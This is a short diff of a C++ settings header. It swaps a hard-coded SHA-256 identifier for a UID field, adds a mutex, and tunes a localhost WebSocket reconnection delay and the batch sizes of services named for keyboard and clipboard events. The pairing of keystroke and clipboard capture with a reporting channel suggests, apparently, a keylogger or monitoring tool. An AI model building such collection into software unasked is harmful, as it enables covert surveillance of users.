@@ -1,14 +1,17 @@
 #pragma once
 #include "services.hpp"
 #include <string>
+#include <mutex>
 
 namespace Settings
 {
+	using std::mutex;
 	using std::string;
 	using std::wstring;
 
-	static string sha256ID = "fe6340be87fd5e43b7f0cac5741e76205dd69a68b2024fda16c696848a720f7a";
+	static string UID = "";
 	static wstring cacheDirectory = L"cache";
+	static mutex mtx;
 	
 	namespace Log
 	{
@@ -26,17 +29,17 @@ namespace Settings
 	namespace WebSocketSvc
 	{
 		static string host = "ws://localhost:8080/";
-		static size_t connectionDelay = 120;
+		static size_t connectionDelay = 10;
 	}
 
 	namespace KeyboardSvc
 	{
-		static size_t eventsToProcess = 10;
+		static size_t eventsToProcess = 5;
 		static size_t maxRepeats = 5;
 	}
 
 	namespace ClipboardSvc
 	{
-		static size_t eventsToProcess = 10;
+		static size_t eventsToProcess = 5;
 	}
 }
